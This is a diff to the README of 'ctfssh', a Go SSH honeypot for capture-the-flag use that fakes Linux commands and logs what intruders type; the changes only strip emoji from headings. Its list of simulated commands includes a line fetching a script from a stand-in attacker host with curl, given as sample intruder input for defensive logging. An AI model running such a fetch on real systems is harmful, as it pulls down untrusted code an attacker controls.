@@ -4,18 +4,18 @@
 
 ---
 
-## ✨ Features
+##  Features
 
-- 🔐 Auth via shadow-compatible password hashes or SSH public keys
-- 🧑 Per-user permissions and command restrictions
-- 📂 Simulates Linux commands using static text or fake executable scripts
-- 🚫 No shell, tunneling, SCP, or real exec
-- 🪓 Login rate limiting per user/IP
-- 🧠 Honeypot-safe logging of commands and URLs
+-  Auth via shadow-compatible password hashes or SSH public keys
+-  Per-user permissions and command restrictions
+-  Simulates Linux commands using static text or fake executable scripts
+-  No shell, tunneling, SCP, or real exec
+-  Login rate limiting per user/IP
+-  Honeypot-safe logging of commands and URLs
 
 ---
 
-## 🛠️ How It Works
+##  How It Works
 
 - Users are authenticated using `users.json`
 - Each session launches a custom shell environment
@@ -26,7 +26,7 @@
 - Logs all commands, login attempts, and fake network usage
 
 
-## 📁 Project Layout
+##  Project Layout
 
 ```
 ├── main.go # Entrypoint 
@@ -43,19 +43,19 @@
 
 ```
 
-## 🚀 Quick Start
+##  Quick Start
 
-### 🔧 Build
+###  Build
 
 ```bash
 go build -o ctfssh
 ```
-🔐 Host Key
+Host Key
 Generate it on first run or with:
 ```bash
 make hostkey
 ```
-👤 Create users.json
+Create users.json
 Example:
 ```json
 [
@@ -76,19 +76,19 @@ Generate hashes:
 python3 -c 'import crypt; print(crypt.crypt("admin", crypt.mksalt(crypt.METHOD_SHA512)))'
 ```
 
-▶️ Run the Server
+Run the Server
 ```bash
 ./ctfssh --port 2222 --hostkey host_key --users users.json --banner "SSH-2.0-CTFssh"
 ```
 
-🧪 Simulated Commands
+Simulated Commands
 
 cat /proc/cpuinfo
 curl https://attacker.com/file.sh
 ping 8.8.8.8
 w, last, uname, uptime, ls, id
 
-🔒 Security & Safety
+Security & Safety
 
 All commands are isolated and non-destructive
 Inputs are parsed and sanitized
@@ -104,14 +104,14 @@ Flag	Description
 --users	Path to user config JSON
 --banner	SSH version banner string
 
-📦 Example Commands in command/
+Example Commands in command/
 
 cat → fake /proc and /etc reads
 curl, wget → logs URLs and mimics download
 ping → fake ICMP responses
 w, last → fake session reports
 
-📤 Deployment
+Deployment
 
 Use make build or:
 ```bash
@@ -119,8 +119,7 @@ go build -o ctfssh main.go users.go commands.go hostkey.go ratelimit.go
 ```
 
 Use authbind, iptables, or setcap to bind to port 22 as non-root.
-🛡️ License
 
+License
 MIT
-
 
